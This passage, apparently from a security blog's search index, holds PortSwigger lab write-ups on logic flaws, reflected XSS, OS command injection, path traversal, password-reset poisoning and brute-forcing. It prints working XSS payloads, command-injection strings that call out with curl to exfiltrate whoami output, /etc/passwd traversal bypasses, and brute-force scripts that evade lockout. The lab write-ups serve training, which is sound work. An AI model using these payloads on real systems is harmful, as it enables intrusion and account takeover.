&quot;print(len(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaattac&#39;))&quot;255Now let’s try to have it trimmed in a way so our Email ends with @dontwannacry.com.Start with attacker@dontwannacry.com continued with our address. (after trial an error, i’ve had to remove a @ from our address otherwise email would not get accepted!)lukaosojnik@Yokai ~ % python3 -c &quot;print(len(&#39;attacker@dontwannacry.com&#39;))&quot; 25We’re at 25 Bytes, we need to divide that from 255 and that’s our fillerlukaosojnik@Yokai ~ % python3 -c &quot;print(len(&#39;a&#39;*230 + &#39;attacker@dontwannacry.com&#39;))&quot;255lukaosojnik@Yokai ~ % python3 -c &quot;print(&#39;a&#39;*230 + &#39;attacker@dontwannacry.com&#39; + &#39;attacker@exploit-0a2e00bc04962b4bc025167101ea00bf.exploit-server.net&#39;)&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaattacker@dontwannacry.comattacker@exploit-0a2e00bc04962b4bc025167101ea00bf.exploit-server.netNow register and login!We can now go to /admin and delete Carlos and solve the labInconsistent security controls - change email address to gain access to internal admin panel This lab’s flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete Carlos.This lab also involves admin panel which has been found in the previous lab /admin. We’ve used Feroxbuster to find it, but it’s obviously easily guessable as well ;). If we visit it we see same message Admin interface only available if logged in as a DontWannaCry user .We have Email client to our disposal, so let’s grab the email there and register an account:We then recieve an Email that we have to confirm.We can change the email after login:See the Admin panel?Go to /admin and delete carlos to solve the labWeak isolation on dual-use endpoint - Removal of current-password parameters while changing password This lab makes a flawed assumption about the user’s privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users’ accounts. To solve the lab, access the administrator account and delete Carlos. You can log in to your own account using the following credentials: wiener:peterWe have a normal page where we can log in. Let’s do that using provided wiener:peterThis is the request that goes out if we change the password:We can obviously change the password without knowing one just by removing current-password from the POST Body.And this works for administrator as well.Log in as administrator go to Admin panel and delete carlos in order to solve the lab!Insufficient workflow validation This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterThis lab is about buying the l33t leather jacket again. Let’s try to do that, but login first!After having done all that, this is the cart:We cannot afford it as Not enough store credit for this purchaseThis is the request in Burp. Notice the consquent /cart?err=INSUFFICIENT_FUNDS.If we buy a product and we do have sufficient funds, the next consequent request would be /cart/order-confirmation?order-confirmation=trueIf we send this GET Request to /cart/order-confirmation?order-confirmation=true our order would be completed and lab would be solved!Authentication bypass via flawed state machine - exploiting default behaviour This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab’s authentication, access the admin interface, and delete Carlos. You can log in to your own account using the following credentials: wiener:peterThere’s not many options what to do here. Let us loginAfter logging in we can select a role. We can choose from User and Content creator.If we choose any one of them we cannot get administrator privileges, even if we use role=admininstrator or role=admin as parameter. What is default behaviour anyways. What happens if we intercept and drop the request after login?We can open /admin and see that our role has defaulted to adminstratorDelete carlos to solve the lab.Flawed enforcement of business rules - alternating coupon codes This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterThere we are buying the l33t jacket all over again. This is the website when the lab starts:There’s a coupon code that we can use. Let’s put the jacket to the cart and copy the coupon code.Heck, we just get a 5$ reduction and we cannot re-apply the coupon as we get Coupon already applied message.If we scroll to the bottom in the shop, we can sign up for newsletter.We get an alert with a new coupon code: SIGNUP30:We can apply that coupon to.We cannot apply two same coupons at one, we can however alternate them, buy the jacked and solve the lab!Infinite money logic flaw This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”. You can log in to your own account using the following credentials: wiener:peterIf we login using provided credentials we see that we can redeem gift cardsWe also have an Email client and there’s newsletter sign-up. Let’s copy our email adress wiener@exploit-0a72005b03bfa152c1f90627018c00df.exploit-server.net and use it for newsletter.We get an alert (not sure if we need an email - probably not)We should not the coupon code SIGNUP30.If we check the shop we can buy Gift Cards for 10$.Now,.. we can buy gift card for 10$ and use coupon code to reduce 30% (3$) and redeem it again.There’s code that we need to redeem:… and there we see that we’ve earned 3$.Now we have to automate this using Macros as there’s CSRF Token that is being sent along!We basically need all POST Requests from sending Giftcard to the card and applying the gift-card.We can now do test runIt has worked until buying the card, however gift-card value has to be changed dynamicaly as i’m seeing 400 Invalid gift card. I will apply the bought gift-card manually and check the settings for 5th request.The 5th request should now be using Derive from previous response. (Response 4)In 4th Request we will need to define new gift-card parameter so it will be used in the last 5th request:If everything went well we should see 302 status after 5th request and 3$ should have been added to our account.Now it’s time to send this to intruder or Turbo Intruder.Make sure to define scope. I’ll use Turbo Intruder so i’ve chosen Extender only.I’ve used simple script which just issues 200 requests:def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=1, pipeline=False, engine=Engine.BURP ) i = 0 while i &amp;lt; 400: engine.queue(target.req) i = i + 1def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status != 404: table.add(req)The funds should go up with every request:With sufficent funds we can buy the l33t jacket and solve the lab.Authentication bypass via encryption oracle This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete Carlos. You can log in to your own account using the following credentials: wiener:peter" }, { "title": "(Portswigger/WebAcademy) - Reflected Cross-Site Scripting (XSS)", "url": "/posts/Reflected_XSS/", "categories": "Web Application, Cross Site Scripting", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-04 09:00:00 +0200", "snippet": "IntroThis post is dedicated to XSS related Labs at Portswigger Web AcademyTOC Intro TOC Finding a XSS Reflected XSS into HTML context with nothing encoded Reflected XSS into attribute with angle brackets HTML-encoded Reflected XSS in canonical link tag Reflected XSS into a JavaScript string with single quote and backslash escaped Reflected XSS into a JavaScript string with angle brackets HTML encoded Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped Reflected XSS into HTML context with most tags and attributes blocked Reflected XSS into HTML context with all tags blocked except custom onesFinding a XSS Test every endpoint Submit random alphanumeric values. Determine the reflection context. XSS between HTML tags XSS in HTML tag attributes XSS into JavaScript XSS via client-side template injection Test a candidate payload. Test alternative payloads. Test the attack in a browser.Reference: https://portswigger.net/web-security/cross-site-scripting/reflectedReflected XSS into HTML context with nothing encoded This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, perform a cross-site scripting attack that calls the alert function.So we need to trigger an alert.This payload does the job:&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;We’ve injected &amp;lt;script&amp;gt; tag into &amp;lt;h1&amp;gt; as there is no sanitization on the server-side (or even client-site) present:Reflected XSS into attribute with angle brackets HTML-encoded This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.We can check how our payload is injected by issuing search. I’ve used simple testing string.We can use payload like &quot; onmouseover=&quot;alert(1) to get out of attribute and create our own.Reflected XSS in canonical link tag This lab reflects user input in a canonical link tag and escapes angle brackets. To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function. To assist with your exploit, you can assume that the simulated user will press the following key combinations: ALT+SHIFT+X CTRL+ALT+X Alt+X Please note that the intended solution to this lab is only possible in Chrome.Payload used: ?%27accesskey=%27x%27onclick=%27alert(1).We can see the inject here:accesskey=&quot;x&quot; This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.Here another reference: https://security.stackexchange.com/questions/205975/is-xss-in-canonical-link-possibleAnd Wikipedia on Link Canonical in general and what’s its purpose: https://en.wikipedia.org/wiki/Canonical_link_elementReflected XSS into a JavaScript string with single quote and backslash escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.I used random string to see where our possible injection might be:So it’s in the Javascript string as the titel already says - obviously.Simply escaping using single quote won’t do the job as it get’s escaped. We can however close the script and run our own using following payload: &amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;This is what happens: Portswigger says: The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.Who would have thought, huh!! :)Reflected XSS into a JavaScript string with angle brackets HTML encoded This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.Now we’re injection again into String in Javascript, however if we try following payload as in the lab before &amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;, then we’ll see this:… we didn’t get far, did we?We’re still lucky as now single quote does not get encoded.This is the payload that i’ve used &#39;; alert(1) //, but this would also work &#39;-alert(1)-&#39;Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.I’ve just entered the string qwrto see where it does get reflected:Let’s try with string qw/-#\\&quot;r.We’get &#39;qw/-#\\\\&amp;amp;quot;r&#39; in response. We get escape on single quote and double quote HTML encoded. If we prepend backslash we can escape the escaped backslash for single quote: \\&#39;-alert(1)// which becomes var searchTerms = &#39;\\\\&#39;-alert(1)//&#39;;Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.Enter &amp;lt;&amp;gt;&quot;&#39;()Since we have injection into JavaScript Template literal, we don’t need to terminat, but can use ${..} like ${alert(document.domain)} which also is solution for this lab.Reflected XSS into HTML context with most tags and attributes blocked This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. Note Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.Let’s try somethingIf we input tags like a, img, script we’ll get a message that Tag is not allowed. I will sent all Tags into intruder to see which might work.We can take body.Regarding events we can do same as it has been done with tags. We can just copy the events from XSS cheatlistNow we would prefer an event where no user interaction is needed. If we take resize, we need a manual resize action, or else the payload won’t trigger. Since we’re sending this to a victim, we can esize a window of iframe.Payload:&amp;lt;iframe src=&quot;https://0a8200dd0430075fc1530929004900c8.web-security-academy.net/?search=&quot;&amp;gt;&amp;lt;body onresize=print()&amp;gt;&quot; onload=this.style.width=&#39;100px&#39;&amp;gt;Reflected XSS into HTML context with all tags blocked except custom ones This lab blocks all HTML tags except custom ones. To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.For this lab we need custom tags. Portswigger has a great cheat sheet for that:Worked for me:&amp;lt;xss autofocus tabindex=1 onfocus=alert(1)&amp;gt;&amp;lt;/xss&amp;gt;Deliver the payload to the victim using the exploit server.&amp;lt;script&amp;gt;location = &#39;https://0ab4004c046a1cd880762c14003c005d.web-security-academy.net/?search=&amp;lt;xss autofocus tabindex=1 onfocus=alert(document.cookie)&amp;gt;&amp;lt;/xss&amp;gt;&#39;;&amp;lt;/script&amp;gt;" }, { "title": "OS Command Injection", "url": "/posts/OS_Command_Injection/", "categories": "Web Application, OS Command Injection", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-03 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the OS Command Injection vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TOC Intro TOC Cheatsheet - termination OS command injection, simple case Blind OS command injection with time delays Blind OS command injection with output redirection Blind OS command injection with out-of-band interaction Blind OS command injection with out-of-band data exfiltrationCheatsheet - termination- &amp;amp;- &amp;amp;&amp;amp;- |- ||- ;- Newline (0x0a or \\n)- ` (inline execution) `- injected command - $(injected command)Previous input may be needed to be terminated using quotes, either single or double!OS command injection, simple case This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user.We get a simple app to start with. If we go on a product and scroll to the bottom then we can check the stock there:If we click on Check Stock, POST request will be sent outThere is no sanitization present and the script will be ran on the OS. We can run any command, e.g., &amp;amp;&amp;amp; ls -la #Blind OS command injection with time delays This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.In this lab, we will see no output from the application, and we should cause a delay. We could do sleep 10 or some othe command like ping that runs longer.Vulnerability is present in the Submit Feedback.OS Injection was done in email parameter: email=email%40email.cm%26+sleep+10+%23 or unencoded email=email@email.cm&amp;amp; sleep 10 #Blind OS command injection with output redirection This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:/var/www/images/ The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the whoami command and retrieve the output.This lab will be interessting as we have to write output to the file.First simply test if we have an OS injection. I’ve used simple sleep again: csrf=nIGTkly4lit9MZDY3vDoYVKDJMAjyAWQ&amp;amp;name=a&amp;amp;email=b@A.com%26sleep+5+%23&amp;amp;subject=c&amp;amp;message=d, with payload (unencoded): &amp;amp;sleep 5 #.To solve the lab, save the whoami output to the writable directory /var/www/images. Payload (unencoded): email=b@A.com&amp;amp;whoami&amp;gt;/var/www/images/whoami.out #.Success with reading the file using /image?filename=whoami.out. How to read the file can be determined by observing the source code. This is how other images are read and displayed.Blind OS command injection with out-of-band interaction This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.This lab looks like the ones above, injection point however is in the email paramter on the feedback form and can be achieved like thiscsrf=ECWUj4AxoEgQQ8bEHffDFlgZ53b9gXuc&amp;amp;name=1&amp;amp;&amp;amp;email=test%40test.de%|`curl+http://b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com`&amp;amp;subject=3&amp;amp;message=4Blind OS command injection with out-of-band data exfiltration This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.In this lab we have to run whoami command and exfiltrate it to our server.Injection point is the same like in the lab above!We can run subcommand in subcommand like this:...email=test%40test.de|$(curl+http://`whoami`.b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com)..." }, { "title": "Directory Traversal", "url": "/posts/Directory_Traversal/", "categories": "Web Application, Directory Traversal", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-02 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Directory Traversal vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TOC Intro TOC File path traversal, simple case File path traversal, traversal sequences blocked with absolute path bypass File path traversal, traversal sequences stripped non-recursively File path traversal, traversal sequences stripped with superfluous URL-decode File path traversal, validation of start of path File path traversal, validation of file extension with null byte bypassFile path traversal, simple case This lab contains a file path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.If we check the source, we see that images will be loaded through parameter.If not sanitized corectly, we’ll have a directory traversal so let’s have a try.Lab has been solved:File path traversal, traversal sequences blocked with absolute path bypass This lab contains a file path traversal vulnerability in the display of product images. The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory. To solve the lab, retrieve the contents of the /etc/passwd file.Solution - Absolute Path: /image?filename=/etc/passwdFile path traversal, traversal sequences stripped non-recursively This lab contains a file path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it. To solve the lab, retrieve the contents of the /etc/passwd file.Solution: /image?filename=....//....//...//....//etc/passwdFile path traversal, traversal sequences stripped with superfluous URL-decode This lab contains a file path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. To solve the lab, retrieve the contents of the /etc/passwd file.Solution: /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwdFile path traversal, validation of start of path This lab contains a file path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. To solve the lab, retrieve the contents of the /etc/passwd file.Solution: /image?filename=/var/www/images/../../../etc/passwdPS: I’m not sure how common this vulnerability is!File path traversal, validation of file extension with null byte bypass This lab contains a file path traversal vulnerability in the display of product images. The application validates that the supplied filename ends with the expected file extension. To solve the lab, retrieve the contents of the /etc/passwd file.Solution: /image?filename=../../../etc/passwd%00.png" }, { "title": "Vulnerable Password Reset", "url": "/posts/Vulnerable_password_reset/", "categories": "Web Application, Broken Authentication", "tags": "Notes, Web Application, Portswigger", "date": "2022-09-30 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. This post is all about vulnerable password reset implementations which can bypass authentication completely or allow the attacker to bypass other security implementationsTOC Intro TOC Basic password reset poisoning - (Host Header) Enumeration - Password Reset Exploitation - Password Account Password reset broken logic Enumerating Password Reset mechanismus Exploiting Password Reset Mechanismus Password reset poisoning via middleware - (X-Forwarded-For Header) Finding and exploiting the vulnerability Password brute-force via password change Brute-Force via password change exploitation Password reset poisoning via dangling markup Enumeration Exploitation Basic password reset poisoning - (Host Header) This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.Enumeration - Password ResetPassword Reset functionality on the front-end is just like any other:In the request we can notice CSRF token and that we can request it for any user basically, but that is by itself not an issue, as email should be sent to users account.Exploitation - Password AccountIf we however change the Host HTTP Header to our own Exploit Server: exploit-0ab000a60403a23bc0663c42014a00e6.web-security-academy.net/exploit, then Email would still be sent:And if we check the logs, we can find the request with the token code right there in the middle:If i now open the link https://0a110040049ca2b2c06b3c6d0058002b.web-security-academy.net/forgot-password?temp-forgot-password-token=bsWHQe5G70EQyDdmK29IbyvrK4SxZ1Cm i can set password for carlos.Lab has been solved:Password reset broken logic This lab’s password reset functionality is vulnerable. To solve the lab, reset Carlos’s password then log in and access his “My account” page. Your credentials: wiener:peter Victim’s username: carlosEnumerating Password Reset mechanismusFirst of all let’s just reset password for wiener. For this we need an email address which is provided by the LabIn password-reset we can either enter username or email. Let’s go for an username:Email comes with a reset link:https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=6MusLEc8VCPVmUsE3mEMxZ3dRDm9q4VLIf i ask for another password-reset token, it changeshttps://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=FcIwW5uTrJCBE9IUbYymI84dYN3SeOsNIf we click on it, we get to the page to enter a new password.If we enter a new password, this is a request that is issued to a backendThe question now arises, can we swap the username with carlos using token that was issued for wiener?Exploiting Password Reset MechanismusIf we simply reuse the previous token that was sent to wiener and swap the user with carlos, it appears that it’s actually workingWe can login now with carlos:peterToken should only be used once and by any means, it should not work for other users that have not requested it.Password reset poisoning via middleware - (X-Forwarded-For Header) This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.Finding and exploiting the vulnerabilityIf we ask for password we get same looking link as in previous lab:https://0adc000d03b93ab9c019658300c800ce.web-security-academy.net/forgot-password?temp-forgot-password-token=Jdno4Z4KTNZHn7cLI1nHytyLFtrGp2HaAnd request does not ask us for a usernameProblem here is actually in middleware and this lab is all about that. If we enter X-Forwarded-Host header, the link sent will actually get tampered with and swapped with our own host. Let’s verify that:And checking the access log on our exploit server, we can see that request is there:We can change the password if we follow the link… and login using same password:More on that topic can be found at Portswigger Reset Password. It all comes down, how the web application crates the token and what its security measures are. As always, it’s always dangerous to use user generated input.Password brute-force via password change This lab’s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos’s account and access his “My account” page. Your credentials: wiener:peter Victim’s username: carlos Candidate passwordsBrute-Force via password change exploitationIf we login, we have this form to update password:… and this is how request looks like in Burp: If we enter wrong password 2 times, account locks for 1 minute! If we enter wrong password AND two different new passwords, we get another error message: Current password is incorrect!Now let’s brute-force using intruder!So get another response that new passwords do not match, meaning we’ve found the current password = jordan.Lab has been solved.Password reset poisoning via dangling markup This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos’s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.Reference: Dangling markup injectionEnumerationWhen we reset a password for our wiener user, we’d get an Email looking like thisThis is the raw Email found at /email, and there appears to be no sanitization.Sent: 2022-10-04 10:54:27 +0000From: no-reply@0ac100e703e228b2c0f54f3d00170041.web-security-academy.netTo: wiener@exploit-0a610053038828f2c0684ff0010e0010.web-security-academy.netSubject: Account recovery&amp;lt;p&amp;gt;Hello!&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Please &amp;lt;a href=&#39;https://0ac100e703e228b2c0f54f3d00170041.web-security-academy.net/login&#39;&amp;gt;click here&amp;lt;/a&amp;gt; to login with your new password: bUzAvNKZqV&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Thanks,&amp;lt;br/&amp;gt;Support team&amp;lt;/p&amp;gt;&amp;lt;i&amp;gt;This email has been scanned by the MacCarthy Email Security service&amp;lt;/i&amp;gt;Another thing to note here is that we recieve a new password per email and not just Change password link!The email above will also be our injection point for partially XSS. Idea of this Dangling attack is to poison HTML, like with XSS, by using tag like (img, a,…) pointing it to our controlled server and leaving the tag open (not closing Tags).If we send Host with a header like this:POST /forgot-password HTTP/1.1Host: 0a4c00770427c3cdc0b732ee006d00b7.web-security-academy.net:&#39;&amp;lt;a href=&quot;exploit-0a100050044cc386c015325d01860069.web-security-academy.net/?ExploitationIf we do that and we know that carlos accesses the same Email client then we should now find the request in the access logs.So there we have two requests from different IP. One is for wiener and other one is for carlos.After ending this Lab, i wasn’t sure when this really would be exploitable. I’d say somewhere between finding XSS and not being able to leverage it, Dangling using HTTP Headers might be something to consider!" }, { "title": "Vulnerable Username-Password Authentication", "url": "/posts/Vulnerable_Username_and_Password_Authentication-copy/", "categories": "Web Application, Broken Authentication", "tags": "Notes, Web Application, Portswigger", "date": "2022-09-30 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TheoryFor successful authentication (considering we’re not dealing with MFA) we need an username and password. Password usually has to be guessed or brute-forced however username may sometimes be enumerated as well. This may be possible while observing: Status Codes Error Messages (in response) Response Times (if application does SQL check for username and password sequentially)TOC Intro Theory TOC Username enumeration via different responses Enumeration Username Bruteforcing with Burp Intruder Password Bruteforcing with ffuf Username enumeration via subtly different responses Username brute-force using Intruder and Grep - Extract Password brute-force using Intruder and Grep - Extract Username enumeration via response timing Measuring response for existing and non-existing accounts with Burp Repeater Brute-Force password Broken brute-force protection, IP block Intro Trying simple password brute-force Solution #1 - Brute-force using python requests Solution #2 - Using Burp Intruder with customized username and password lists. Solution #3 - Brute-force using Burp Turbo Intruder Username enumeration via account lock Broken brute-force protection, multiple credentials per requestUsername enumeration via different responses This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:Candidate usernamesCandidate passwordsTo solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.EnumerationWe can see the webpage’s login:Application throws an error Invalid UsernameUsername Bruteforcing with Burp IntruderLet’s paste the Candidate usernames into Burp’s Intruder:We’ve found the user, which is user.Let’s bruteforce the password with ffufPassword Bruteforcing with ffufffuf -w portswigger_passwords:FUZZ_PASS -u &quot;https://0a3e005e03bf0fbac09413a80059004c.web-security-academy.net/login&quot; -d &quot;username=user&amp;amp;password=FUZZ_PASS&quot; --fs 3098Mind that --fs 3098 was added to filter out the requests which return invalid password. They all have same response size.Both, username and password have been retrieved. Labb has been solved.Username enumeration via subtly different responses This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: Candidate usernames Candidate passwords To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.This lab can be bruteforced with just trying every username or password, however we’re supposed to pay attention to subtly different responses.Username brute-force using Intruder and Grep - ExtractLet’s add Grep - Export.As soon as we highlight Invalid username or password, parameters will be set automaticaly. Just apply that, set the same username list from portswigger and run the Intruder:One request is slightly different - Username: alertsPassword brute-force using Intruder and Grep - ExtractLet’s do the same with the password. Remember to change the password list! Grep - Extract can stay the same.We can notice that 11111111 gave us different response and HTTP 302:Lab has been solvedUsername enumeration via response timing This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page. Your credentials: wiener:peterHere we’ve got an account, so we can measure how long does a query need for existing account and for a non-existing.Measuring response for existing and non-existing accounts with Burp RepeaterWe have around 10ms difference. Let’s try with the wordlist but watchout: Error: You have made too many incorrect login attempts. Please try again in 30 minute(s).We have to take care of the IP-Block, which we can bypass using X-Forwarded-For header. We’d use Pitchfork mode for that, so IP and Username change with every cycle!We can see that with access the difference is even greater, we should however always double-check! ;)Brute-Force passwordAssuming the username really is access let’s brute-force password.Again with using Pitchfork mode and cycling the IPs in X-Forwarded-ForSo there it is, a sunshine ;).This is the problem that i’ve had. I’ll just intercept the request and add some random IP when authenticating as access:sunshineLab has been solved:Broken brute-force protection, IP block This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim’s password, then log in and access their account page.Your credentials: wiener:peter Victim’s username: carlos Candidate passwordsIntroThis would be the second Lab now where we have to bypass the IP block for brute-forcing. Let us get to it. We have a victim carlos and we have working credentialsTrying simple password brute-forceOn the 4th try we get a message that we have to wait a minute before trying again.Spoiler Alert: X-Forwarded-For does not help here.What however works is: 1st request = Brute-force password for carlos 2nd request = Brute-force password for carlos 3rd request = Login with wiener:peter which resets the counter …repeatMy ideas here were create a wordlist for username and password where at every 3rd try is come wiener:peter credentials.Solution #1 - Brute-force using python requestsIn python this is relatively easily scriptable by using 2 for loop cycles.import requestsimport sysrequests.urllib3.disable_warnings()def bruteforce(target, cycles, password_list, username, working_credz): for password in password_list: if &quot;:&quot; in password: credentials_split = password.split(&quot;:&quot;) password = credentials_split[1] username = credentials_split[0] else: username=username password=password session = requests.Session() session.verify = False headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;} data = {&quot;username&quot;:username, &quot;password&quot;:password} s = requests.post(target, data=data, headers=headers) if username not in working_credz: print(&quot;(+) tried %s:%s; Content-Length: %s&quot; %(username,password,s.headers[&#39;Content-length&#39;])) #print(s.headers) #print(r.text) return 0def main(): if len(sys.argv) != 6: print(&quot;(!) usage: %s &amp;lt;target&amp;gt; &amp;lt;wordlist&amp;gt; &amp;lt;cycles&amp;gt; &amp;lt;working_credentials&amp;gt; &amp;lt;username&amp;gt;&quot; % sys.argv[0]) print(&quot;(!) eg: %s https://target.tld/login ./passwords 2 &#39;user:pass&#39; username&quot; % sys.argv[0]) sys.exit(-1) target = str(sys.argv[1]) wordlist = str(sys.argv[2]) cycles = int(sys.argv[3]) working_credz = str(sys.argv[4]) username = str(sys.argv[5]) print(&quot;(+) Target: %s; Wordlist: %s; Cycles before using working credentials: %s; Working Credentials: &#39;%s&#39;; Bruteforcing user: %s&quot; % (target,wordlist,cycles,working_credz,username)) with open(wordlist) as f: passwords = [line.rstrip() for line in f] # List needs to be initialy set and should be reset every 3rd turn, but this will be done in for loop password_list=[] for password in passwords: password_list.append(password) if len(password_list) == 2: password_list.append(working_credz) #print(&quot;(+) Batch: %s&quot; %(password_list)) bruteforce_session = bruteforce(target, cycles, password_list, username, working_credz) password_list=[] else: continue print(&quot;\\n(+) All passwords have been checked!&quot;)if __name__ == 